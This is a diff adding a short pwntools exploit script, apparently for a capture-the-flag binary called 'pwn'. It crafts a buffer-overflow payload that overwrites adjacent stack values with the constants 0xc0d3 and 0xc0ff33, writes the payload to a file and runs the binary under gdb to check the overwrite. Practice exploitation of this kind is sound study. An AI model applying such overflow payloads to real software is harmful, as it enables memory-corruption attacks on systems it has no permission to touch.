@@ -1,0 +1,29 @@
+from pwn import *
+import time
+
+#r = remote("127.0.0.1",6666)
+r = process('./pwn')
+
+elf = ELF('./pwn')
+addr_main = elf.symbols['main']
+
+#print (r.recvline())
+
+payload = (b"A")*100
+payload += (b"B")*4
+payload += p32(0xc0d3, endian='little')
+payload += p32(0xc0ff33, endian='little')
+payload += (b"F")*4
+
+with open("input.txt", "wb") as filp:
+	filp.write(payload)
+
+#r.sendline(payload)
+
+gdb.attach(r,gdbscript="""
+	b *0x0000555555400959
+	r < input.txt
+	x/x $rbp-0x4
+	""")
+
+#print(r.recvline())
